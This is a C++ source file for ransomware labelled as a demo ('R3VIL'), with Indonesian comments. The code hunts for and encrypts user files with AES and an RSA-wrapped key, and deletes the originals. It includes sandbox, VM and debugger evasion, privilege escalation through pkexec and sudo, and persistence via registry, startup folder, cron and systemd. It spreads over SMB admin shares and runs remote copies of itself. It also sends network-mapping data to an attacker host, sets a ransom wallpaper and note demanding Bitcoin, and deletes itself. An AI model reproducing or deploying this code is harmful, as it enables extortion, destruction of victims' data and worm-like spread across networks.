// r3vil.cpp - R3VIL Ransomware Demo with GUI
#include <cryptopp/cryptlib.h>
#include <cryptopp/aes.h>
#include <cryptopp/rsa.h>
#include <cryptopp/osrng.h>
#include <cryptopp/modes.h>
#include <cryptopp/filters.h>
#include <cryptopp/files.h>

#ifdef _WIN32
#include <windows.h>
#include <shlobj.h>
#include <tlhelp32.h>
#include <intrin.h>
#else
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <pwd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/time.h>
#endif

#include <iostream>
#include <fstream>
#include <vector>
#include <string>
#include <algorithm>
#include <cctype>
#include <filesystem>
#include <cstdlib>
#include <thread>
#include <chrono>
#include <mutex>
#include <queue>
#include <condition_variable>
#include <functional>
#include <atomic>
#include <sstream>
#include <random>
#include "src/network_mapper.h"
#include "src/ransom_gui.h"          // GUI Always-on-Top

using namespace CryptoPP;
namespace fs = std::filesystem;

// ====================== KONFIGURASI ======================
const std::vector<std::string> TARGET_EXTENSIONS = {
    ".txt", ".doc", ".docx", ".pdf", ".xls", ".xlsx", ".ppt", ".pptx",
    ".jpg", ".jpeg", ".png", ".gif", ".mp4", ".mov", ".avi",
    ".sql", ".db", ".cpp", ".h", ".py", ".js", ".ts",
    ".csv", ".zip", ".rar", ".7z", ".md"
};

const std::vector<std::string> ENCRYPTED_EXTENSIONS = { ".revil" };

const std::vector<std::string> EXCLUDE_KEYWORDS = {
    "winlogon.exe", ".dll", ".sys", ".exe", ".ini", "pagefile.sys", "hiberfil.sys",
    "rs", "rs.cpp", "rs_debug", "generate_keys"
};

const std::string LOG_FILE = "affected_files.log";

const std::vector<std::string> CRITICAL_SKIP_PREFIXES = {
#ifdef _WIN32
    "C:\\Windows\\", "C:\\Program Files\\", "C:\\Program Files (x86)\\",
    "C:\\$Recycle.Bin\\", "C:\\System Volume Information\\",
    "C:\\PerfLogs\\", "C:\\Recovery\\"
#else
    "/bin/", "/sbin/", "/etc/", "/dev/", "/proc/", "/sys/", "/lib/", "/lib64/",
    "/usr/", "/var/log/", "/run/", "/boot/", "/root/.ssh/", "/etc/ssh/",
    "/snap/", "/var/lib/snapd/"
#endif
};

const std::string PUBLIC_KEY_FILE = "rsa_public.der";

// ====================== GLOBAL MUTEX ======================
std::mutex log_mutex;

// ====================== THREAD POOL ======================
class ThreadPool {
private:
    std::vector<std::thread> workers;
    std::queue<std::function<void()>> tasks;
    std::mutex queue_mutex;
    std::condition_variable condition;
    std::atomic<bool> stop{false};

public:
    explicit ThreadPool(size_t threads = std::thread::hardware_concurrency() * 2) {
        for (size_t i = 0; i < threads; ++i) {
            workers.emplace_back([this] {
                while (true) {
                    std::function<void()> task;
                    {
                        std::unique_lock<std::mutex> lock(queue_mutex);
                        condition.wait(lock, [this] { return stop || !tasks.empty(); });
                        if (stop && tasks.empty()) return;
                        task = std::move(tasks.front());
                        tasks.pop();
                    }
                    task();
                }
            });
        }
    }

    template<class F>
    void enqueue(F&& task) {
        {
            std::unique_lock<std::mutex> lock(queue_mutex);
            if (stop) return;
            tasks.emplace(std::forward<F>(task));
        }
        condition.notify_one();
    }

    ~ThreadPool() {
        stop = true;
        condition.notify_all();
        for (std::thread& worker : workers) {
            if (worker.joinable()) worker.join();
        }
    }
};

// ====================== HELPER FUNCTIONS ======================
std::string to_lower(const std::string& s) {
    std::string lower = s;
    std::transform(lower.begin(), lower.end(), lower.begin(), [](unsigned char c){ return std::tolower(c); });
    return lower;
}

bool ends_with(const std::string& str, const std::string& suffix) {
    if (suffix.size() > str.size()) return false;
    return str.compare(str.size() - suffix.size(), suffix.size(), suffix) == 0;
}

bool should_encrypt(const std::string& filepath) {
    std::string filename = fs::path(filepath).filename().string();
    std::string lname = to_lower(filename);
    for (const auto& ext : ENCRYPTED_EXTENSIONS) if (ends_with(lname, ext)) return false;
    for (const auto& kw : EXCLUDE_KEYWORDS) if (lname.find(to_lower(kw)) != std::string::npos) return false;
    for (const auto& ext : TARGET_EXTENSIONS) if (ends_with(lname, ext)) return true;
    return false;
}

bool is_critical_path(const std::string& path) {
    std::string lpath = to_lower(path);
    for (const auto& prefix : CRITICAL_SKIP_PREFIXES) {
        if (lpath.find(to_lower(prefix)) == 0) return true;
    }
    return false;
}

std::vector<std::string> get_all_roots() {
    std::vector<std::string> roots = {".", "/home", "/", "/root"};
    return roots;
}

// ====================== EVASION ======================
std::string exec_cmd(const std::string& cmd) {
    char buffer[256];
    std::string result;
    FILE* pipe = popen(cmd.c_str(), "r");
    if (!pipe) return "";
    while (fgets(buffer, sizeof(buffer), pipe)) result += buffer;
    pclose(pipe);
    return result;
}

bool is_proot_anlinux() {
    if (getenv("PROOT")) return true;
    if (access("/.dockerenv", F_OK) == 0) return true;
    std::string uname = exec_cmd("uname -a 2>/dev/null");
    if (uname.find("Android") != std::string::npos) return true;
    return false;
}

bool is_virtual_machine() {
    if (is_proot_anlinux()) return false;
    if (std::thread::hardware_concurrency() <= 2) return true;
    return false;
}

bool is_debugger_present() {
    std::ifstream status("/proc/self/status");
    std::string line;
    while (std::getline(status, line)) {
        if (line.find("TracerPid:") == 0) return std::stoi(line.substr(10)) != 0;
    }
    return false;
}

bool is_sandbox_environment() {
    if (is_proot_anlinux()) return false;
    if (std::thread::hardware_concurrency() <= 2) return true;
    std::string up = exec_cmd("cat /proc/uptime 2>/dev/null | awk '{print $1}' || echo '0'");
    if (!up.empty() && std::stod(up) < 300) return true;
    return false;
}

void perform_evasion_checks() {
    std::cout << "[*] Running anti-analysis & evasion checks...\n";
    if (getenv("REVIL_BYPASS")) {
        std::cout << "[!] Evasion bypass activated (REVIL_BYPASS=1)\n";
        return;
    }
    if (is_proot_anlinux()) {
        std::cout << "[!] AnLinux / proot environment detected → Evasion bypassed.\n";
        return;
    }

    if (is_virtual_machine() || is_debugger_present() || is_sandbox_environment()) {
        std::cout << "[!] Suspicious environment detected! Exiting silently...\n";
        std::this_thread::sleep_for(std::chrono::seconds(3));
        exit(0);
    }

    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dis(800, 2500);
    std::this_thread::sleep_for(std::chrono::milliseconds(dis(gen)));

    std::cout << "[✓] Evasion checks passed.\n";
}

// ====================== PERSISTENCE MANAGER ======================
class PersistenceManager {
private:
    std::string current_exe;

    std::string get_current_exe() {
#ifdef _WIN32
        char path[MAX_PATH];
        GetModuleFileNameA(NULL, path, MAX_PATH);
        return std::string(path);
#else
        char path[1024];
        ssize_t len = readlink("/proc/self/exe", path, sizeof(path)-1);
        if (len != -1) {
            path[len] = '\0';
            return std::string(path);
        }
        return "";
#endif
    }

public:
    PersistenceManager() {
        current_exe = get_current_exe();
    }

    bool try_escalate_privileges() {
#ifdef __linux__
        if (geteuid() == 0) {
            std::cout << "[✓] Already running as ROOT\n";
            return true;
        }
        std::cout << "[!] Trying privilege escalation...\n";
        setenv("REVIL_ESCALATED", "1", 1);
        execlp("pkexec", "pkexec", current_exe.c_str(), nullptr);
        system(("sudo " + current_exe).c_str());
        exit(1);
#endif
        return false;
    }

    void install_all() {
        std::cout << "[*] Installing persistence mechanisms...\n";
#ifdef _WIN32
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "WindowsUpdateSvc", 0, REG_SZ, (BYTE*)current_exe.c_str(), current_exe.size() + 1);
            RegCloseKey(hKey);
            std::cout << "[✓] Registry Run persistence added\n";
        }
        char startup[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_STARTUP, NULL, 0, startup);
        std::string startup_path = std::string(startup) + "\\SystemHelper.exe";
        CopyFileA(current_exe.c_str(), startup_path.c_str(), FALSE);
        std::cout << "[✓] Startup folder persistence added\n";

#else  // Linux
        std::string cron = "(crontab -l 2>/dev/null; echo \"*/10 * * * * " + current_exe + " >/dev/null 2>&1\") | crontab -";
        system(cron.c_str());
        std::cout << "[✓] Cron persistence installed\n";

        if (geteuid() == 0) {
            std::ofstream svc("/etc/systemd/system/revil-update.service");
            svc << "[Unit]\nDescription=System Update Service\nAfter=network.target\n\n";
            svc << "[Service]\nType=simple\nExecStart=" << current_exe << "\nRestart=always\nRestartSec=60\n";
            svc << "[Install]\nWantedBy=multi-user.target\n";
            svc.close();
            system("systemctl daemon-reload 2>/dev/null && systemctl enable revil-update.service 2>/dev/null");
            std::cout << "[✓] Systemd persistence installed\n";
        }
#endif
    }
};

// ====================== WALLPAPER CHANGER ======================
class WallpaperChanger {
private:
    std::string create_ransom_wallpaper() {
        const char* home = getenv("HOME");
        if (!home) home = "/tmp";
        std::string ppm = std::string(home) + "/.ransom.ppm";
        std::string jpg = std::string(home) + "/.ransom.jpg";

        std::ofstream f(ppm, std::ios::binary);
        int w=800, h=500;
        f << "P6\n" << w << " " << h << "\n255\n";
        for (int y=0; y<h; y++) for (int x=0; x<w; x++) {
            unsigned char p[3];
            if (y<80 || y>h-80) {p[0]=0;p[1]=0;p[2]=0;}
            else if (x>100 && x<w-100 && y>150 && y<350) {p[0]=255;p[1]=255;p[2]=255;}
            else {p[0]=180;p[1]=0;p[2]=0;}
            f.write((char*)p,3);
        }
        f.close();
        system(("convert " + ppm + " " + jpg + " 2>/dev/null || cp " + ppm + " " + jpg).c_str());
        fs::remove(ppm);
        return jpg;
    }

public:
    void change_wallpaper() {
        std::cout << "[*] Changing wallpaper...\n";
        std::string wp = create_ransom_wallpaper();

#ifdef _WIN32
        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, (PVOID)wp.c_str(), SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        std::cout << "[✓] Windows wallpaper changed\n";
#else
        std::vector<std::string> cmds = {
            "gsettings set org.gnome.desktop.background picture-uri 'file://" + wp + "' 2>/dev/null",
            "xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor0/image-path -s '" + wp + "' 2>/dev/null",
            "feh --bg-scale '" + wp + "' 2>/dev/null"
        };
        bool ok = false;
        for (auto& c : cmds) if (system(c.c_str()) == 0) { ok = true; break; }
        if (ok) std::cout << "[✓] Linux wallpaper changed\n";
        else std::cout << "[!] Could not change wallpaper\n";
#endif
    }

    void create_readme_file() {
        std::string path;
#ifdef _WIN32
        char desk[MAX_PATH];
        SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desk);
        path = std::string(desk) + "\\README_LOCKED.txt";
#else
        const char* home = getenv("HOME");
        if (!home) home = ".";
        path = std::string(home) + "/Desktop/README_LOCKED.txt";
#endif

        std::ofstream f(path);
        if (f) {
            f << "========================================\n";
            f << "     YOUR FILES HAVE BEEN ENCRYPTED     \n";
            f << "========================================\n\n";
            f << "To recover: Send $500 BTC to 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n";
            f << "Email transaction ID to decrypt@onionmail.org\n";
            f.close();
            std::cout << "[✓] README_LOCKED.txt created on Desktop\n";
        }
    }
};

// ====================== SELF-DELETE ======================
void self_delete() {
    std::cout << "[*] Self-delete activated...\n";
#ifdef _WIN32
    char path[MAX_PATH];
    GetModuleFileNameA(NULL, path, MAX_PATH);
    std::string cmd = "cmd.exe /c timeout 5 & del /f \"" + std::string(path) + "\"";
    system(cmd.c_str());
#else
    unlink("/proc/self/exe");
    std::cout << "[✓] Binary self-deleted.\n";
#endif
}

// ====================== ENCRYPT FILE & DIRECTORY ======================
void encrypt_file(const std::string& filepath, const SecByteBlock& key, const byte* iv) {
    try {
        std::lock_guard<std::mutex> lock(log_mutex);
        std::cout << "  [*] Encrypting: " << filepath << "\n";

        std::string plaintext;
        FileSource(filepath.c_str(), true, new StringSink(plaintext));

        CBC_Mode<AES>::Encryption enc;
        enc.SetKeyWithIV(key, key.size(), iv);

        std::string ciphertext;
        StringSource(plaintext, true, new StreamTransformationFilter(enc, new StringSink(ciphertext)));

        std::string encpath = filepath + ".revil";
        FileSink out(encpath.c_str());
        out.Put(iv, AES::BLOCKSIZE);
        out.Put(reinterpret_cast<const byte*>(ciphertext.data()), ciphertext.size());
        out.MessageEnd();

        fs::remove(filepath);

        std::ofstream log(LOG_FILE, std::ios::app);
        if (log) log << filepath << " → " << encpath << "\n";
        std::cout << "  [✓] Encrypted: " << filepath << "\n";
    } catch (...) {
        std::cout << "  [✗] Failed: " << filepath << "\n";
    }
}

void encrypt_directory(const std::string& root, const SecByteBlock& key, const byte* iv) {
    std::cout << "[*] Scanning: " << root << "\n";
    std::vector<std::string> files;
    try {
        for (const auto& e : fs::recursive_directory_iterator(root, fs::directory_options::skip_permission_denied)) {
            if (e.is_regular_file() && should_encrypt(e.path().string()) && !is_critical_path(e.path().string())) {
                files.push_back(e.path().string());
            }
        }
    } catch (...) {}
    if (files.empty()) return;

    ThreadPool pool(8);
    for (const auto& f : files) {
        pool.enqueue([&f, &key, iv]() { encrypt_file(f, key, iv); });
    }
}

void perform_lateral_movement(const SecByteBlock& key, const byte* iv) {
    std::cout << "[*] Starting aggressive lateral movement (SMB)...\n";

#ifdef _WIN32
    // ================== WINDOWS VERSION (Paling Kuat) ==================
    std::cout << "[*] Windows SMB Lateral Movement active...\n";

    std::vector<std::string> admin_shares = {"C$", "ADMIN$", "IPC$"};

    // Simple subnet scan (192.168.1.x) - bisa diubah sesuai subnet kamu
    for (int i = 1; i <= 254; ++i) {
        std::string target = "192.168.1." + std::to_string(i);

        std::cout << "[*] Probing " << target << " ... ";

        for (const auto& share : admin_shares) {
            std::string unc = "\\\\" + target + "\\" + share;

            NETRESOURCE nr = {0};
            nr.dwType = RESOURCETYPE_DISK;
            nr.lpRemoteName = (LPSTR)unc.c_str();

            DWORD res = WNetAddConnection2(&nr, NULL, NULL, CONNECT_TEMPORARY);
            if (res == NO_ERROR || res == ERROR_ALREADY_ASSIGNED) {
                std::cout << "Connected!\n";
           char self_exe[MAX_PATH];
                GetModuleFileNameA(NULL, self_exe, MAX_PATH);

                std::string dest = unc + "\\WindowsUpdateSvc.exe";

                if (CopyFileA(self_exe, dest.c_str(), FALSE)) {
                    std::cout << "[+] Ransomware copied to " << dest << "\n";

                    // Coba jalankan remotely
                    SHELLEXECUTEINFOA sei = { sizeof(sei) };
                    sei.lpVerb = "open";
                    sei.lpFile = dest.c_str();
                    sei.nShow = SW_HIDE;

                    if (ShellExecuteExA(&sei)) {
                        std::cout << "[+] Successfully executed on remote target: " << target << "\n";
                    } else {
                        std::cout << "[-] Execute failed (may need credentials)\n";
                    }
                }
                WNetCancelConnection2(unc.c_str(), 0, TRUE);
                break;
            }
        }
    }

#else
    // ================== LINUX / ANLINUX VERSION ==================
    std::cout << "[*] Linux SMB Lateral Movement (using smbclient)...\n";

    // Cek apakah smbclient tersedia
    if (system("which smbclient > /dev/null 2>&1") != 0) {
        std::cout << "[!] smbclient not found. Skipping SMB lateral movement.\n";
        std::cout << "[*] Install with: sudo apt install smbclient\n";
        return;
    }

    // Scan subnet sederhana (ubah sesuai jaringanmu)
    for (int i = 1; i <= 20; ++i) {   // batasi scan agar tidak terlalu lama
        std::string target = "192.168.1." + std::to_string(i);
    std::string cmd = "smbclient -L " + target + " -N -g 2>/dev/null | grep -q 'Disk'";
        if (system(cmd.c_str()) == 0) {
            std::cout << "[+] SMB share detected on " << target << "\n";

            // Copy ransomware ke share (contoh ke IPC$ atau share umum)
            char self_path[1024];
            ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path)-1);
            if (len > 0) self_path[len] = '\0';

            std::string copy_cmd = "smbclient //"
                                 + target 
                                 + "/C$ -N -c 'put " 
                                 + std::string(self_path) 
                                 + " WindowsUpdateSvc.exe' 2>/dev/null";

            if (system(copy_cmd.c_str()) == 0) {
                std::cout << "[+] Copied ransomware to //" << target << "/C$\n";

                // Coba jalankan (sulit di Linux tanpa credentials, tapi bisa coba)
                std::string exec_cmd = "smbclient //" + target + "/C$ -N -c 'put " 
                                     + std::string(self_path) 
                                     + " /Windows/Temp/update.exe; quit' 2>/dev/null";
                system(exec_cmd.c_str());
            }
        }
    }
#endif

    std::cout << "[*] Lateral movement phase completed.\n";
}

// ====================== MAIN ======================
int main() {
    perform_evasion_checks();

    std::cout << "\n========================================\n";
    std::cout << "     RANSOMWARE DEMO - FOR TESTING     \n";
    std::cout << "========================================\n\n";

    std::cout << "[*] Starting network mapping...\n";
    {
        NetworkMapper mapper;
        mapper.perform_mapping();
        mapper.send_to_attacker("http://192.168.1.2:5000");
    }
    std::cout << "[✓] Network mapping completed\n";

    PersistenceManager persistence;
    persistence.try_escalate_privileges();

    if (!fs::exists(PUBLIC_KEY_FILE)) {
        std::cout << "[!] rsa_public.der not found! Please run ./generate first.\n";
        return 1;
    }

    AutoSeededRandomPool prng;
    SecByteBlock key(32);
    byte iv[AES::BLOCKSIZE];
    prng.GenerateBlock(key, key.size());
    prng.GenerateBlock(iv, sizeof(iv));

    // ================== PERBAIKAN AES KEY ENCRYPTION ==================
    std::cout << "[*] Encrypting AES key with RSA Public Key...\n";
    try {
        RSA::PublicKey pub;
        FileSource fs(PUBLIC_KEY_FILE.c_str(), true);
        pub.Load(fs);

        RSAES_OAEP_SHA_Encryptor encryptor(pub);

        std::string enc_key;
        StringSource ss(key, key.size(), true,
            new PK_EncryptorFilter(prng, encryptor, new StringSink(enc_key))
        );

        FileSink fileSink("aes_key.enc", true);
        fileSink.Put(reinterpret_cast<const byte*>(enc_key.data()), enc_key.size());
        fileSink.MessageEnd();                    // Penting!

        std::cout << "[✓] AES key successfully encrypted and saved to aes_key.enc\n";
        std::cout << "    Size: " << enc_key.size() << " bytes\n";
    } catch (const std::exception& e) {
        std::cout << "[✗] Failed to encrypt AES key: " << e.what() << std::endl;
        return 1;
    }

    perform_lateral_movement(key, iv);

    std::cout << "\n[*] Starting file encryption...\n";
    auto roots = get_all_roots();
    for (const auto& root : roots) {
        encrypt_directory(root, key, iv);
    }

    WallpaperChanger wallpaper;
    wallpaper.change_wallpaper();
    wallpaper.create_readme_file();

    // ====================== GUI ======================
    std::cout << "[*] Meluncurkan Ransom GUI (Always-on-Top)...\n";

    RansomGUI ransomGUI;
    ransomGUI.start(
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa",
        "decrypt@onionmail.org",
        500.0,
        72
    );

    persistence.install_all();

    std::cout << "[!] GUI aktif. Program akan terus berjalan...\n";

    // Biarkan program hidup lama agar GUI tetap muncul
    std::this_thread::sleep_for(std::chrono::hours(168));  // 7 hari

    std::cout << "[*] Self-deleting...\n";
    self_delete();

    std::cout << "\n[✓] Demo finished.\n";
    return 0;
}
